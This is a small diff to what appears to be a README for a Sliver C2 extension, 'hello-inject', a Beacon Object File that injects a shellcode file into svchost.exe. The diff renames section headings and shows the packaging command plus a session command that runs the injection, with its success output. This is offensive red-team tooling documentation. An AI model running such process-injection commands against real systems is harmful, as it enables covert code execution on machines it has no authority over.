@@ -181,7 +181,7 @@ $ tar czvf ../hello-inject.tar.gz .
 ./extension.json
 ```
 
-### Execution
+### Install Sliver BOF
 Steps include installing and loading the extension (who knows):
 
 ```
@@ -213,8 +213,12 @@ Flags:
 ======
   -h, --help           display help
   -t, --timeout int    command timeout in seconds (default: 60)
+```
 
-# run
+### Execute Sliver BOF
+Within a beacon or session context:
+
+```
 [server] sliver (CRUCIAL_BRICK) > hello-inject c:\\windows\\systmem32\\svchost.exe /opt/sliver/SPLENDID_EMERGENCE.bin 4343
 
 [*] Successfully executed hello-inject (coff-loader)
